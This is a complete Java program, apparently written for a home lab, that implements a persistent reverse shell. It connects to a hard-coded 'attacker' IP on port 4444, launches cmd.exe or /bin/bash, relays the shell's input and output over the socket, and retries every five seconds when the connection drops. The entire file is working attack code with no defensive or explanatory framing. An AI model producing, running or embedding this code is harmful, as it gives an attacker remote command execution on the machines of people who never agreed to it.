import java.io.*;
import java.net.*;

public class StableReverseShell {

    public static void main(String[] args) {
        String attackerIP = "172.23.253.61"; // static IP (your WSL IP)
        int port = 4444;                    // static port (make sure it's open)

        while (true) {
            try {
                Socket socket = new Socket(attackerIP, port);
                System.out.println("Connected to attacker!");

                String os = System.getProperty("os.name").toLowerCase();
                String shell = os.contains("win") ? "cmd.exe" : "/bin/bash";

                Process process = new ProcessBuilder(shell).redirectErrorStream(true).start();

                // Process IO
                InputStream processOut = process.getInputStream();
                OutputStream processIn = process.getOutputStream();

                // Socket IO
                InputStream attackerIn = socket.getInputStream();
                OutputStream attackerOut = socket.getOutputStream();

                // Thread to send shell output to attacker
                Thread sendOutput = new Thread(() -> {
                    try {
                        byte[] buffer = new byte[1024];
                        int length;
                        while ((length = processOut.read(buffer)) != -1) {
                            attackerOut.write(buffer, 0, length);
                            attackerOut.flush();
                        }
                    } catch (IOException ignored) {}
                });

                // Thread to send attacker input to shell
                Thread receiveCommand = new Thread(() -> {
                    try {
                        byte[] buffer = new byte[1024];
                        int length;
                        while ((length = attackerIn.read(buffer)) != -1) {
                            processIn.write(buffer, 0, length);
                            processIn.flush();
                        }
                    } catch (IOException ignored) {}
                });

                sendOutput.start();
                receiveCommand.start();

                sendOutput.join();
                receiveCommand.join();

                process.destroy();
                socket.close();

            } catch (Exception e) {
                System.out.println("Connection failed. Retrying in 5 seconds...");
                try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
            }
        }
    }
}
